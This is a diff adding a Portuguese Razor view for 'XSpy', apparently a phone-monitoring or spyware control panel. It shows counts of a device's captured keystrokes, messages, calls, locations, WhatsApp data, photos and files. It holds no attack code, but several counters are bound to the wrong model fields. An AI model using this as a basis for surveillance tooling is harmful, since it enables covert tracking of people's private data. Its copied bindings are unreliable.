@@ -1,0 +1,174 @@
+﻿@{
+    ViewData["Title"] = "Aparelhos conectados";
+    ViewData["PageScript"] = "/js/app/device/list.js";
+
+}
+@model XSpy.Shared.Models.Views.DashViewModel
+
+@section Styles {
+    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/jszip-2.5.0/dt-1.10.23/b-1.6.5/b-html5-1.6.5/b-print-1.6.5/r-2.2.7/datatables.min.css" />
+}
+<section class="content">
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-info elevation-1"><i class="fas fa-battery-three-quarters"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Bateria</span>
+                        <span class="info-box-number">
+                            @Model.BatteryLevel
+                            <small>%</small>
+                        </span>
+                    </div>
+                    <!-- /.info-box-content -->
+                </div>
+                <!-- /.info-box -->
+            </div>
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-primary elevation-1"><i class="fas fa-keyboard"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Palavras</span>
+                        <span class="info-box-number">
+                            @Model.Words
+
+                        </span>
+                    </div>
+                    <!-- /.info-box-content -->
+                </div>
+                <!-- /.info-box -->
+            </div>
+
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-warning elevation-1" style="color: white !important"><i class="fas fa-keyboard"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Mensagens</span>
+                        <span class="info-box-number">
+                            @Model.Messages
+                        </span>
+                    </div>
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-danger elevation-1"><i class="far fa-address-book"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Contatos</span>
+                        <span class="info-box-number">
+                            @Model.Contacts
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-primary elevation-1"><i class="fas fa-phone"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Chamadas</span>
+                        <span class="info-box-number">
+                            @Model.Calls
+                        </span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-danger elevation-1"><i class="fas fa-map-marked-alt"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Localizações</span>
+                        <span class="info-box-number">
+                            @Model.Locations
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-secondary elevation-1"><i class="fas fa-wifi"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Wifi</span>
+                        <span class="info-box-number">
+                            @Model.WifiCount
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-success elevation-1"><i class="fab fa-whatsapp"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Whatsapp</span>
+                        <span class="info-box-number">
+                            @Model.WhatsApp
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-secondary elevation-1"><i class="fas fa-images"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Fotos</span>
+                        <span class="info-box-number">
+                            @Model.WhatsApp
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-warning elevation-1" style="color:white !important"><i class="fas fa-folder"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Arquivos</span>
+                        <span class="info-box-number">
+                            @Model.Files
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-primary elevation-1" style="color:white !important"><i class="fas fa-download"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Downloads</span>
+                        <span class="info-box-number">
+                            @Model.Files
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-3">
+                <div class="info-box">
+                    <span class="info-box-icon bg-info elevation-1" style="color:white !important"><i class="far fa-bell"></i></span>
+
+                    <div class="info-box-content">
+                        <span class="info-box-text">Notificações</span>
+                        <span class="info-box-number">
+                            @Model.Files
+                        </span>
+                    </div>
+                </div>
+            </div>
+
+
+        </div>
+        <!-- /.row -->
+    </div>
+    <!-- /.container-fluid -->
+</section>
